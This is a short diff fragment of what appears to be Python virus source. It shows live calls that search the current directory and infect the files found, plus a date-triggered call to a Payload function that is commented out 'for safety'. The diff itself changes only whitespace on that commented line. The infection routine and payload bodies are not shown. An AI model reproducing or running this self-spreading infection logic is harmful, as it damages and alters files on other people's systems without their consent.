@@ -53,4 +53,4 @@ def Payload():
 FTI = search(os.path.abspath("")) #Search
 infect(FTI) #Infect
 if datetime.datetime.now().month == 8 and datetime.datetime.now().day == 11:
-    #Payload() #For safety!
+    #Payload() #For safety! 
